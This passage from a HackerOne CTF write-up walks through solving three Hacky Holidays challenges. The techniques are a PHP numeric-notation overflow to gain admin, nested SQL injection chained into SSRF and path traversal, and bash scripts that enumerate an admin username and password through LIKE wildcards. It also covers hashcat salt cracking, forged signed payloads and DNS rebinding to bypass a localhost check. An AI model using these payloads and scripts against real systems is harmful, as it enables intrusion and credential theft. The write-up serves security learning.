record occupies one line of exactly 113 characters. format is as follows:\n{F1129772}\nwhere numbers in square brackets describe how many characters each field occupy.\nLast character (#113) gives info if created user is an admin or not but regular user doesn't have control over this field. It's always defined as 'N' (not admin).\n\nThe idea to exploit this app is to overflow somehow the line construction algorithm and store character 'Y' in the last byte of the line.\n\nIt seems that all parts of the line are properly padded/truncated to their max length... Except `Age` which is `integer`.\nHere is the part of the code that checks this parameter:\n```php\n            if (!is_numeric($_POST[\"age\"])) {\n                $errors[] = 'Age entered is invalid';\n            }\n            if (strlen($_POST[\"age\"]) \u003e 3) {\n                $errors[] = 'Age entered is too long';\n            }\n            $age = intval($_POST[\"age\"]);\n```\nWe can see that first it checks if we are dealing with a string containing numeric value, if doesn't contain more than 3 chars and THEN it is converted to integer.\n\nThe problem is that PHP accepts different number notations. E.g. notation *1e3* is perfectly fine for PHP and after conversion it will become `1000`.\n\nThat is how we can overflow this line creation algorithm. Setting `age=1e3` passes all the checks: it is a number, it's exactly 3 characters long. And after conversion we have a number that is 4 characters long!\n\nLet's sign up with following request:\n```http\nPOST /signup-manager/ HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\naction=signup\u0026username=account123\u0026password=password\u0026age=1e3\u0026firstname=XXX\u0026lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n```\n`Age` parameter contains our malicious number. `Lastname` contains a lot of 'Y' characters to overflow the Admin field.\n\nThe result is a response with a session Cookie:\n```http\nHTTP/1.1 302 Found\nServer: nginx/1.18.0 (Ubuntu)\nDate: Fri, 25 Dec 2020 15:05:37 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nSet-Cookie: token=d843a6e76ee8a818f5429498c4337a23; expires=Fri, 25-Dec-2020 16:05:37 GMT; Max-Age=3600\nLocation: /signup-manager/\nContent-Length: 0\n```\nWhen we refresh main page with this cookie set we get the flag:\n{F1129788}\n### Flag 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}\n\n# Flag 11 - Recon Server\nThis challenge starts from hidden directory (available after solving challenge 10) https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59\n\nCouple of observed things:\n1. Call to `/album?hash=jdh34k` endpoint will response with links to `/picture` endpoint witch retrieves pictures from the server\n2. `/picture` endpoint accepts `data` parameter that is base64 encoded JSON:\n```json\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/db507bdb186d33a719eb045603020cec.jpg\",\"auth\":\"bbf295d686bd2af346fcd80c5398de9a\"}\n```\n3. User cannot tamper with `image` parameter as this is protected by `auth` signature.\n4. There is an `/api` endpoint but any call results in an error: `{\"error\":\"This endpoint cannot be visited from this IP address\"}`\n\n## First SQL Injection\nIt turned out ``/album?hash=` parameter is vulnerable to SQL injection.\nFollowing request:\n```http\nGET /r3c0n_server_4fdk59/album?hash=c'+UNION+ALL+SELECT+1,2,3--+- HTTP/1.1\n```\n\nresponds with:\n\n```html\n\u003cimg class=\"img-responsive\" src=\"/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzBhMzgyYzYxNzdiMDQzODZlMWE0NWNlZWFhODEyZTRlLmpwZyIsImF1dGgiOiJlYzVhOTkyMGUxNzdjY2M4NDk3NDE0NmY5M2FlMDRiMCJ9\"\u003e\n```\nwhich is a request for image `0a382c6177b04386e1a45ceeaa812e4e.jpg`.\n\n## SQLi inside SQLi\nInteresting point is that for those two payloads:\n\n* `UNION ALL SELECT 1,2,3`\n* `UNION ALL SELECT 2,2,3`\n\nwe get different results (different images filenames).\n\nThat means value of first column is probably used to retrieve the file name from the database. We can imagine the pseudo code like this:\n```\n($file_id, $col3, $col_3) = SELECT file_id, col_2, col_3 FROM fileIdTable\n($file_name) = SELECT file_name FROM files WHERE file_id=$file_id\n```\nSo maybe we could put there second SQLi to force second query to respond with string under our control. After some fiddling this payload did the trick:\n`UNION ALL SELECT \"-1' union all select NULL,NULL,'A'-- -\",2,3-- -`\n\n```http\nGET /r3c0n_server_4fdk59/album?hash='+UNION+ALL+SELECT+\"-1'+union+all+select+NULL,NULL,'A'--+-\",2,3--+- HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n```\nResults in response:\n```\n{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/A\",\"auth\":\"60146c0f9a44a825faa23e2dd179c13d\"}\n```\nSo now we are in control of filename!\n\n## Path traversal and SSRF\nAs we can control the path that is retrieved by the server maybe we can access the `/api` endpoint that was not accessible before.\n\nTo speed up the process of performing SQLi and retrieving the data following bash script was used:\n```bash\n#!/bin/bash\n\nurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\\?hash=\\'+UNION+ALL+SELECT+\\\"-1\\'+union+all+select+NULL,NULL,\\'${1}\\'--+-\\\",2,3--+- -s|grep data= |sed 's/^.*src=\"\\([^\"]*\\)\"\u003e/\\1/')\ncurl -s \"https://hackyholidays.h1ctf.com$url\"\necho\n```\nScript usage:\n```shell\n./sqlinception.sh some_path\nExpected HTTP status 200, Received: 404\n```\nThat means that we performed an SSRF request but application expected return code 200 but got 404.\nLet's check what will be retrieved when we hit existing path:\nTo access main page we can use path traversal:\n\n```shell\n./sqlinception.sh ..\nInvalid content type detected\n```\nThat means system returned code 200 but content type was not an image (as we call an endpoint that is used to retrieve images, probably it expects `image/*` content type.\n\nAlso we have access to API now:\n```shell\n./sqlinception.sh ../api/x\nExpected HTTP status 200, Received: 404\n```\nWe didn't get 401 Unathorized but 404 Not found.\n\n## API endpoint enumeration\nWith a bit of bash automation a we can enumerate API endpoints:\n```bash\nwhile read word\n  do echo -n $word:\n  bash sqlinception.sh ../api/$word\ndone \u003cwordlist.txt |grep -v 404\n```\nFollowing endpoints returned *Invalid content type detected* instead of *error 404*:\n* /api/user\n* /api/ping\n\n## API parameter enumeration\nWhen we try to pass some parameters to /api/user endpoint we get error 400:\n```shell\n./sqlinception.sh ../api/user\\?a=1\nExpected HTTP status 200, Received: 400\n```\n\nAccording to API \"documentation\" from the `/api` page:\n{F1129906}\nError 400 means param name is invalid. Again we can enumerate valid params:\n```bash\nwhile read word\n  do echo -n $word:\n  bash sqlinception.sh ../api/user\\?$word=1\ndone \u003cwordlist.txt |grep -v 400\n```\n\nValid parameters found:\n* username\n* password\n\n## User enumeration\nWhen we call `/api/user` endpoint with parameter `username` set to something random we get error code 204 (Successful request but no data found).\n```shell\n./sqlinception.sh ../api/user\\?username=xx\nExpected HTTP status 200, Received: 204\n```\n\nBut after some fuzzing with different characters it turned out that response is different when `%` sign is used:\n```shell\n./sqlinception.sh ../api/user\\?username=%\nInvalid content type detected\n```\nImmediate idea was that maybe username is passed to SQL query into LIKE statement. And maybe we can find the username by sequentialy checking responses to `a%`, `b%` etc.\nAgain bash script helped:\n```bash\nprevchar=''\nwhile true; do\n    for char in {{a..z},{0..9},{A..Z}}; do\n        ./sqlinception.sh ../api/user\\?username=$prevchar$char% |grep -q -v 204\n        if [ $? -eq 0 ]; then\n             echo -n $char\n             prevchar=$prevchar$char\n             break\n       fi\n    done\ndone\n```\nresult is: **grinchadmin**\n\nWe can also enumerate password as this is working exactly the same with `%` sign:\n```bash\nwhile true; do\n    for char in {{a..z},{0..9},{A..Z}}; do\n        ./sqlinception.sh ../api/user\\?password=$prevchar$char% |grep -q -v 204\n        if [ $? -eq 0 ]; then\n             echo -n $char\n             prevchar=$prevchar$char\n             break\n       fi\n    done\ndone\n```\nResult: **s4nt4sucks**\n\nNow we have admin credentials and we can log in into **Attack Box** https://hackyholidays.h1ctf.com/attack-box/login\n\n{F1130002}\n\n### Flag 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}\n\n# Flag 12\nWe have access to Grinch Network Attack server. Our goal is to perform DDoS attack on Grinch own network using his attack server.\n\nThere are three IP addresses to attack. When attack is initiated following request is made:\n```http\nGET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\nCookie: attackbox=d0xxxxxxxxxx75e0199a5e91dde9687\n```\n\nwhere `payload` parameter holds base64 encoded JSON string:\n```json\n{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n```\n\n## Cracking the salt\nSo we have a MD5 signature that protects the `target` parameter. Any change in signature or target param results in an error.\n\nBut having both message (IP address in this case) and a hash we could try to bruteforce the salt that is usually appended to message before hashing (as `hash = md5(salt+message)`).\n\nFirst we need to prepare a wordlist of salt+message:\n```bash\ncat rockyou.txt | awk '{print $0\"203.0.113.33\"}' \u003e wordlist.txt\n```\nNext we need to match known MD5 hash to each hashed wordlist item (fastest way is to use `hashcat`):\n```bash\necho 5f2940d65ca4140cc18d0878bc398955 \u003e hash.txt\nhashcat -m 0 -a 0 hash.txt wordlist.txt\n```\n\nHashcat quickly finds matching hash:\n```\n5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: MD5\nHash.Target......: 5f2940d65ca4140cc18d0878bc398955\nTime.Started.....: Fri Dec 25 22:03:10 2020 (1 sec)\nTime.Estimated...: Fri Dec 25 22:03:11 2020 (0 secs)\nGuess.Base.......: File (list.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.Dev.#1.....:  4458.6 kH/s (0.58ms)\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 5357568/14343893 (37.35%)\nRejected.........: 0/5357568 (0.00%)\nRestore.Point....: 5349376/14343893 (37.29%)\nCandidates.#1....: mrkr2518203.0.113.33 -\u003e mpisti88203.0.113.33\nHWMon.Dev.#1.....: N/A\n```\nmd5 salt: **mrgrinch463**\n\n## Changing IP address\nHaving a salt we can sign our own messages. As the goal of final challenge is to DDoS Grinch, obvious selection would be to change IP address to 127.0.0.1:\n```bash\necho -n mrgrinch463127.0.0.1 | md5sum -\n3e3f8df1658372edf0214e202acb460b\n```\nNext we launch DDoS attack with following payload:\n```\njson:\n{\"target\":\"127.0.0.1\",\"hash\":\"c4d677f60c076b72bb28d2051c76831a\"}\n\nbase64 encoded: \neyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==\n```\n\nFinal URL: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==\n\nResult: \n{F1130044}\n\nUnfortunately our attack on localhost was detected.\n\n## Localhost check bypass\nOne thing that was observed during initial recon phase was that `target` parameter accepts also hostnames.\nUnfortunately testing all kinds of localhost check bypasses:\n* using hostname pointing to 127.0.0.1 like http://localtest.me\n* using different IP notations\n\nall failed.\n\nThat means hostnames are resolved and IP address is checked against the blacklist.\n\nBut we can try to use **DNS rebinding attack** where we put DNS service that resolves the same hostname to two different IP addresses in sequence (also setting very short TTL to prevent caching of DNS responses).\n\nIf application first resolves hostname to check against blacklist but then resolves it again to perform an action, we can bypass first check by providing valid IP. Second DNS request will resolve to malicious IP.\n\nThis is quite easy to achieve with online services like https://lock.cmpxchg8b.com/rebinder.html.\n\nWe can specify two IP addresses and service will prepare DNS rebinding attack:\n{F1130059}\n\nService generated following hostname:  7f000001.cb007121.rbndr.us\n\nLet's construct the payload:\n```\necho -n mrgrinch4637f000001.cb007121.rbndr.us | md5sum\n54171d97f5299ef84c1c01a676eaa917  -\n\njson:\n{\"target\":\"7f000001.cb007121.rbndr.us\",\"hash\":\"54171d97f5299ef84c1c01a676eaa917\"}\n\nbase64 encoded: \neyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsImhhc2giOiI1NDE3MWQ5N2Y1Mjk5ZWY4NGMxYzAxYTY3NmVhYTkxNyJ9\n```\n\nFinal URL: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsImhhc2giOiI1NDE3MWQ5N2Y1Mjk5ZWY4NGMxYzAxYTY3NmVhYTkxNyJ9\n\nVideo PoC:\n{F1130072}\n\n### Flag 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":464323,"username":"jeti","name":"Jakub Wojnarowicz","bio":"","cleared":false,"website":null,"location":"Cracow","created_at":"2019-01-12T08:42:26.326Z","url":"https://hackerone.com/jeti","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}